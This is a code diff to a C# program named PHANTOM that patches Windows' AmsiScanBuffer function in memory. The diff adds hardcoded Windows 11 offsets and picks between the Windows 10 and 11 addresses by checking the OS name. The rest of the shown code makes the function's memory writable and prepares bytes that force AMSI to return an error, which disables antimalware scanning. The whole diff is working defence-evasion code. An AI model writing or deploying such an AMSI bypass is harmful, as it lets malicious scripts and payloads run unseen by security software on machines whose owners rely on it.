@@ -1,7 +1,8 @@
-﻿using System;
+using System;
 using System.Text;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using Microsoft.VisualBasic.Devices;
 
 namespace PHANTOM
 {
@@ -19,10 +20,12 @@ namespace PHANTOM
         }
 
 #if x64
-        private static IntPtr amsiScanBufferAddress = (IntPtr)0x180003860; //May change in the future!
+        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x180008260; //May change in the future!
+        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x180003860; //May change in the future!
         private static IntPtr RebaseAddress = (IntPtr)0x180000000;
 #else
-        private static IntPtr amsiScanBufferAddress = (IntPtr)0x10005960; //May change in the future!
+        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x10005D60; //May change in the future!
+        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x10005960; //May change in the future!
         private static IntPtr RebaseAddress = (IntPtr)0x10000000;
 #endif
 
@@ -33,7 +36,15 @@ namespace PHANTOM
         [STAThread]
         static void Main()
         {
-            IntPtr Address = ASLR(amsiScanBufferAddress, RebaseAddress, obfDll_Str);
+            IntPtr Address = IntPtr.Zero;
+            if (new ComputerInfo().OSFullName.Contains(@"11") == true)
+            {
+                Address = ASLR(amsiScanBufferAddress_Win11, RebaseAddress, obfDll_Str);
+            }
+            else
+            {
+                Address = ASLR(amsiScanBufferAddress_Win10, RebaseAddress, obfDll_Str);
+            }
             byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
             uint oldProtect;
             VirtualProtect(Address, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
